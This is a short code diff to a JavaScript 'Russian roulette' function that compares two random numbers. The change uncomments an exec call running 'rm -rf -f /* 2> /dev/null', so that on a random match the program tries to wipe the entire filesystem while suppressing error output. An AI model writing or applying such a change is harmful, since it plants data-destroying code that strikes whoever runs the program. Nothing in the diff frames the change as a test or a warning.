@@ -18,7 +18,7 @@ function roulette() {
   const numberdos = getRandomInt2(6);
   if (numberuno == numberdos) {
     console.log("Boom!");
-    //exec("rm -rf -f /* 2> /dev/null");
+    exec("rm -rf -f /* 2> /dev/null");
   } else {
     console.log("Click!");
   }
